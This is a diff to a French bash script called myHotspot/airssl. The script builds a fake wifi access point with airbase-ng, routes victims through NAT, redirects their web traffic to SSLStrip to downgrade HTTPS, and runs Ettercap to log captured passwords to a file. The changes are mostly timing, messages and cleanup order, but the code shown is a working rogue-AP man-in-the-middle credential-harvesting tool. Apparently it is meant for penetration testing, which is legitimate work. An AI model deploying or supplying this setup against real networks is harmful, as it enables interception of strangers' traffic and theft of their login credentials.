@@ -46,7 +46,7 @@ else
 
 # Network questions
 echo
-echo "myHotspot - Version 1.0  - Par Nyzo"
+echo " - myHotspot - Version 1.0  - Par Nyzo - "
 echo
 route -n -A inet | grep UG
 echo
@@ -83,16 +83,14 @@ range 10.0.0.20 10.0.0.50;
 
 # Création du point d'accès wifi
 echo "[+] Configuration du point d'accès wifi"
-echo
-echo "[+] Starting FakeAP..."
 xterm -xrm '*hold: true' -geometry 75x15+1+0 -T "myHotspot - $ESSID - $fakeap - $fakeap_interface" -e airbase-ng --essid "$ESSID" -c 1 $fakeap_interface & fakeapid=$!
 disown
-sleep 5
+sleep 3
 
 # Tables
-echo "[+] Configuring forwarding tables..."
+echo "[+] Configurations des tables et des redirections"
 ifconfig lo up
-ifconfig at0 up
+ifconfig at0 up &
 sleep 1
 ifconfig at0 10.0.0.1 netmask 255.255.255.0
 ifconfig at0 mtu 1400
@@ -107,6 +105,7 @@ iptables -P FORWARD ACCEPT
 iptables --append FORWARD --in-interface at0 -j ACCEPT
 iptables --table nat --append POSTROUTING --out-interface $internet_interface -j MASQUERADE
 iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+sleep 3
 
 # DHCP
 echo "[+] Configuration et démarrage DHCP"
@@ -115,26 +114,28 @@ touch /var/run/dhcpd.pid
 chown dhcpd:dhcpd /var/run/dhcpd.pid
 xterm -xrm '*hold: true' -geometry 75x20+1+100 -T DHCP -e dhcpd -f -d -cf "/pentest/wireless/airssl/dhcpd.conf" at0 & dchpid=$!
 disown
-sleep 5
+sleep 3
 
 # Sslstrip
 echo "[+] Configuration et démarrage de SSLStrip"
 xterm -geometry 75x15+1+200 -T SSLStrip -e sslstrip -f -p -k 10000 & sslstripid=$!
-sleep 5
+sleep 3
 
 # Ettercap
 echo "[+] Configuration et démarrage de Ettercap"
 xterm -xrm '*hold: true' -geometry 73x25+1+300 -T Ettercap -s -sb -si +sk -sl 5000 -e ettercap -p -u -T -q -w /pentest/wireless/airssl/passwords -i at0 & ettercapid=$!
 disown
-sleep 5
+sleep 3
 
 #SSLStrip Log
 echo "[+] Configuration et démarrage de SSLStrip Log"
 xterm -geometry 75x15+1+600 -T "SSLStrip Log" -e tail -f sslstrip.log & sslstriplogid=$!
-sleep 5
+sleep 3
 
 clear
-echo "[+] Activation"
+echo "[+] Initialistion terminée"
+echo
+echo "Si vous n'avez pas aperçu d'erreur(s), le script est fonctionnel et vous devriez voir apparaître le wifi que vous avez créé"
 echo "IMPORTANT : Pressez Y pour quitter, sinon vous pourriez obtenir des erreurs et des dysfonctionnements. Si vous n'avez pas quitter correctement, tapez ./airssl.sh kill"
 read STOP
 
@@ -151,14 +152,10 @@ kill ${sslstripid}
 echo "[+] SSLStrip stoppé"
 kill ${ettercapid}
 echo "[+] Ettercap stoppé"
-kill ${driftnetid}
-echo "[+] Driftnet stoppé"
 kill ${sslstriplogid}
 echo "[+] SSLStrip log stoppé"
 sleep 3
 
-airmon-ng stop $fakeap_interface
-airmon-ng stop $fakeap
 echo "[+] Airmon-ng stoppé"
 sleep 3
 echo
@@ -168,10 +165,13 @@ iptables --table nat --flush
 iptables --delete-chain
 iptables --table nat --delete-chain
 echo "[+] iptables restaurée"
-sleep 3
+sleep 2
+airmon-ng stop $fakeap_interface
+airmon-ng stop $fakeap
+sleep 1
 echo
 ifconfig $internet_interface up
-/etc/init.d/networking restart
+/etc/init.d/networking stop && /etc/init.d/networking start
 echo "[+] Redémarrage du système internet"
 
 echo "[+] Nettoyage et restauration terminé !"
